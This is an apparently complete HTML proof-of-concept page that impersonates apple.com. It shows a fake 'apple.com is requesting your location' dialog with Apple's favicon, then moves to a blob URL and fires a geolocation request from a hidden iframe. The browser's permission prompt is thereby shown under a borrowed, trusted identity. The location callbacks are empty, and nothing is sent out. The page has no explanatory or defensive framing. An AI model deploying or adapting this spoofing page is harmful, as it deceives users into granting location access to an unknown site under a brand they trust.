<!DOCTYPE html>
<html>
<head>
  <title>apple.com</title>
  <style>
    body {
      background: #fff;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      margin: 0; padding: 0;
    }
    .container {
      max-width: 400px;
      margin: 100px auto;
      padding: 30px;
      border: 1px solid #ccc;
      border-radius: 6px;
      box-shadow: 0 0 10px rgba(0,0,0,0.2);
      text-align: center;
    }
    .container img {
      vertical-align: middle;
      width: 20px;
    }
    button {
      padding: 10px 20px;
      font-weight: bold;
      border: none;
      border-radius: 4px;
      background: #0071e3;
      color: #fff;
      margin-top: 20px;
      cursor: pointer;
    }
    button:hover {
      background: #005bb5;
    }
  </style>
</head>
<body>
  <script>
    const spoofHTML = `
      <link rel='icon' href='https://www.apple.com/favicon.ico'>
      <div class=\"container\">
        <img src='https://www.apple.com/favicon.ico'> <b>apple.com</b> is requesting your location.
        <p>This is used to verify your region settings.</p>
        <button onclick=\"req()\">Allow</button>
        <iframe src='data:text/html,<script>navigator.geolocation.getCurrentPosition(()=>{},()=>{});</script>' style='display:none'></iframe>
      </div>
      <script>
        function req() {
          navigator.geolocation.getCurrentPosition(() => {}, () => {});
        }
      <\/script>
    `;

    const blob = new Blob([spoofHTML], { type: 'text/html' });
    const url = URL.createObjectURL(blob);
    location.href = url;
  </script>
</body>
</html>
